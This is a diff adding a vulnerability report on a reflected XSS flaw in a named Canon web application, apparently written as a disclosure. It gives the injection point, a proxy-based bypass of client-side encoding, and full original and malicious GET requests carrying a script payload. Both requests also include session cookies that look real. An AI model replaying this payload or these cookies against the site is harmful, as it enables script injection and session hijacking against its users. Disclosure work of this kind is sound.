@@ -1,0 +1,39 @@
+Reflected XSS (Cross-Site Scripting)
+
+
+Type: Unauthenticated Remote attack
+
+We have identified that "https://lfpp.csa.canon.com" website is vulnerable to XSS attacks. This is due to that the Web App fails to adequately sanitize request strings of malicious JavaScript. By leveraging this issue, an attacker is able to cause arbitrary HTML and script code to be executed in a user's browser within the security context of the affected site. This attack can be used in conjunction with a social engineering techniques.
+
+We have managed to bypass Client side protection (URL encoding), by intercepting the GET request using a HTTP proxy tool, and then replacing the encoded payload with the original one. Server Side protection exists for sanitizing/filtering web parameter values, but does not work in the specific injection point "/tss/tss_product_detail.jsp?PRODUCT%3C%3Eprd_id".
+
+Below, evidence is provided.
+
+
+Original Request:
+GET /tss/tss_product_detail.jsp?PRODUCT%3C%3Eprd_id=845524441900309%3E&SKU%3C%3Esku_id=1689949372029461&FOLDER%3C%3Efolder_id=2534374302162637&bmUID=msDpquh HTTP/1.1
+Host: lfpp.csa.canon.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: NWIDENTITY=J4jM4+Cr4XWm1/K11/EGTfSFb9DBON3WsXP84OrJowWd5deS5IxyOBsvWJft84VhOBse9XnrJrR4dicPBQUtGA1wX50Id8L1aALWmZJH7I/qsA3RHHZjkVpZTjM0lOHQoK6DTAjT1UqlZO7dyV9a3krlep9APxokwBeHhizLJIRmU/fzx8+wBvSRZLW45GW6ydTHU4IP8MjTv09ovnDLgA7AXjSgjGp/if2LHAUDqA3U5QNJ+h9eWJO/jz2xa+/u4QQDuCmJuoh7ObA5W55ka7UhJEP+dkxOGT6yKoYsxpo1j4VYJ5UTFoAy6B+bnCQ5TmPYsHrtCBA8qEihqxGHz6NAXH8hc9mE0o3PzcbZpac6umggMnThNOhERv07usZsSqehE7Xm1qo52eaHZ/J+5GnRR+ATg9qN9c6Tw5K35XWqfIEjU4FLC1u6qkU485x9Qs7PzfOBTv+0CB0iBeyk5TE6sZQFvt9uI6qIvidkNPbQN+mQRD1TQzhln/PmloKXoC5hcu2EKWFIg1BExi9RFJs+FiTLhPN2lCbLcqS61O3HIGCvwN63f4qU2GBuYE3XllIEm3vm9+iSeM70fz6s33mq0TEeUC9X0VKyPjbpxAcSMgXx3AxWsr28OEUa4BmEB1RjMuDsP8yMPGZfLUQSfoYluvXDfwEdJtfNuQ7Vnz0RsgQ7/CZJVJGr/e2h9+lJ; _ga=GA1.2.1362394334.1624533568; _gid=GA1.2.2063969011.1624533568; _cs_c=1; _cs_id=6c6d98e9-57e4-a459-a026-9e419b32434e.1624533567.1.1624533567.1624533567.1591371016.1658697567995.Lax.0; __CT_Data=gpv=1&ckp=tld&dm=canon.com&apv_34_www55=1&cpv_34_www55=1&rpv_34_www55=1; _CT_RS_=Recording; WRUID=3349924668114009; WTPERSIST=; WebLogicSession=vTTLgJ5MgvyvCSRlSFBghYZGC2C6JTzkGJJ1LJN41wbGTJPb1myc!-142077916; cookieID=190006441; bmSessionId=d62tFojxcmms_5eq_66i_AXo98ufC_N7mJ_kqavliit_10bn; lfpp=!viC4DRWxsA8SqoXw+33q+FeFVSd67cy0aWQh54yB70AhuM031/3GI3zYNEbGRNL3jb+wbG1tc9dqeg==; bmTzOff=-180; bmScrRes=1280x720; bmClrDpt=24; bmJava=No; __utma=138525934.933219616.1624533616.1624533616.1624537813.2; __utmc=138525934; __utmz=138525934.1624533616.1.1.utmccn=(referral)|utmcsr=google.com|utmcct=/|utmcmd=referral; ASPSESSIONIDCQARCBCB=KCPNKGACIEMIHECMOJKFINBO; _gcl_au=1.1.1156394707.1624537429; _ga=GA1.3.1362394334.1624533568; _gid=GA1.3.2063969011.1624533568; _mkto_trk=id:206-CLL-191&token:_mch-canon.com-1624537433218-84858; __utmb=138525934
+Upgrade-Insecure-Requests: 1
+
+
+Edited/Malicious Request:
+GET /tss/tss_product_detail.jsp?PRODUCT"<script>alert('byIthaca')</script>testEprd_id=845524441900309&SKU%3C%3Esku_id=1689949372029461&FOLDER%3C%3Efolder_id=2534374302162637&bmUID=msDpquh HTTP/1.1
+Host: lfpp.csa.canon.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: NWIDENTITY=J4jM4+Cr4XWm1/K11/EGTfSFb9DBON3WsXP84OrJowWd5deS5IxyOBsvWJft84VhOBse9XnrJrR4dicPBQUtGA1wX50Id8L1aALWmZJH7I/qsA3RHHZjkVpZTjM0lOHQoK6DTAjT1UqlZO7dyV9a3krlep9APxokwBeHhizLJIRmU/fzx8+wBvSRZLW45GW6ydTHU4IP8MjTv09ovnDLgA7AXjSgjGp/if2LHAUDqA3U5QNJ+h9eWJO/jz2xa+/u4QQDuCmJuoh7ObA5W55ka7UhJEP+dkxOGT6yKoYsxpo1j4VYJ5UTFoAy6B+bnCQ5TmPYsHrtCBA8qEihqxGHz6NAXH8hc9mE0o3PzcbZpac6umggMnThNOhERv07usZsSqehE7Xm1qo52eaHZ/J+5GnRR+ATg9qN9c6Tw5K35XWqfIEjU4FLC1u6qkU485x9Qs7PzfOBTv+0CB0iBeyk5TE6sZQFvt9uI6qIvidkNPbQN+mQRD1TQzhln/PmloKXoC5hcu2EKWFIg1BExi9RFJs+FiTLhPN2lCbLcqS61O3HIGCvwN63f4qU2GBuYE3XllIEm3vm9+iSeM70fz6s33mq0TEeUC9X0VKyPjbpxAcSMgXx3AxWsr28OEUa4BmEB1RjMuDsP8yMPGZfLUQSfoYluvXDfwEdJtfNuQ7Vnz0RsgQ7/CZJVJGr/e2h9+lJ; _ga=GA1.2.1362394334.1624533568; _gid=GA1.2.2063969011.1624533568; _cs_c=1; _cs_id=6c6d98e9-57e4-a459-a026-9e419b32434e.1624533567.1.1624533567.1624533567.1591371016.1658697567995.Lax.0; __CT_Data=gpv=1&ckp=tld&dm=canon.com&apv_34_www55=1&cpv_34_www55=1&rpv_34_www55=1; _CT_RS_=Recording; WRUID=3349924668114009; WTPERSIST=; WebLogicSession=vTTLgJ5MgvyvCSRlSFBghYZGC2C6JTzkGJJ1LJN41wbGTJPb1myc!-142077916; cookieID=190006441; bmSessionId=d62tFojxcmms_5eq_66i_AXo98ufC_N7mJ_kqavliit_10bn; lfpp=!viC4DRWxsA8SqoXw+33q+FeFVSd67cy0aWQh54yB70AhuM031/3GI3zYNEbGRNL3jb+wbG1tc9dqeg==; bmTzOff=-180; bmScrRes=1280x720; bmClrDpt=24; bmJava=No; __utma=138525934.933219616.1624533616.1624533616.1624537813.2; __utmc=138525934; __utmz=138525934.1624533616.1.1.utmccn=(referral)|utmcsr=google.com|utmcct=/|utmcmd=referral; ASPSESSIONIDCQARCBCB=KCPNKGACIEMIHECMOJKFINBO; _gcl_au=1.1.1156394707.1624537429; _ga=GA1.3.1362394334.1624533568; _gid=GA1.3.2063969011.1624533568; _mkto_trk=id:206-CLL-191&token:_mch-canon.com-1624537433218-84858; __utmb=138525934
+Upgrade-Insecure-Requests: 1
+
+
+Affected Source Code:
+<a HREF="https://lfpp.csa.canon.com//tss/tss_product_detail.jsp?PRODUCT"><script>alert('byIthaca')</script>testEprd_id=845524441900309&SKU%3C%3Esku_id=1689949372029461&FOLDER%3C%3Efolder_id=2534374302162637&bmUID=msDpquh#" ONCLICK="changeLayers('section0'); return false">Applications & Utilities</a>
+</td>
